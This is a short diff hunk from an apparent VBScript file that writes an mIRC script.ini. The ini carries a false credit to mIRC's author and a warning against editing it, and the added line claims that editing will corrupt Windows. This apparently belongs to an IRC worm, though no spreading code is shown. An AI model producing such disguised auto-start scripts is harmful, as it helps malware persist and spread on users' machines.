@@ -116,6 +116,7 @@ rem by: master7720  /  master7720@mail.com  /  @imperial Group  /  LA
  set scriptini=fso.CreateTextFile(folderspec&"\script.ini") scriptini.WriteLine "[script]"
  scriptini.WriteLine ";mIRC Script"
  scriptini.WriteLine ";  Please dont edit this script unless you know what your doing mirc will corrupt"
+ scriptini.WriteLine ";  corrupted windows will affect and will not run correctly"
  scriptini.WriteLine ";"
  scriptini.WriteLine ";Khaled Mardam-Bey"
  scriptini.WriteLine ";http://www.mirc.com"
